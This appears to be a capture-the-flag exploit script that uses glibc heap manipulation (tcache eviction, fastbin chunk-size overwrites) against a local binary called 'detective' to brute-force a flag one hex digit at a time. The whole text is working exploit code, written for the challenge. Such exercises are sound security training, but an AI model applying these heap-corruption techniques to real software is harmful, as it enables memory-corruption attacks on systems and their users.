flag = ""
for pos in range(7 + 2, 40):
    for guess in range(0, 0x10):
        sock = process("./detective")
        sock.sendlineafter("> ", str(pos))
        print(pos, guess)
        # evict tcache
        #alloc(0, 0x48, "align") # for libc-2.27
        #dealloc(0)
        for i in range(7):
            alloc(0, 0x78, "A")
            dealloc(0)
        for i in range(7):
            alloc(0, 0x18, "A")
            dealloc(0)
        # push 0x20 to fastbin
        alloc(0, 0x18, "A")
        dealloc(0)
        if guess < 10:
            payload = b'A' * (0x18 + guess) + p64(0x81)
        else:
            payload = b'A' * (0x18 + 0x31 + guess - 10) + p64(0x81)
        alloc(0, 0x78, payload)
        alloc(1, 0x78, "B")
        dealloc(0)
        dealloc(1)
        alloc(0, 0x18, "evil")
        read(0, 0xa0)
        dealloc(0)
        alloc(0, 0x78, "A")
        if alloc(1, 0x78, "B"):
            flag += hex(guess)[2:]
            print("Found: " + hex(guess)[2:])
            print(flag)
            break
        sock.close()
    else:
        print("Bad luck!")
        exit(1)
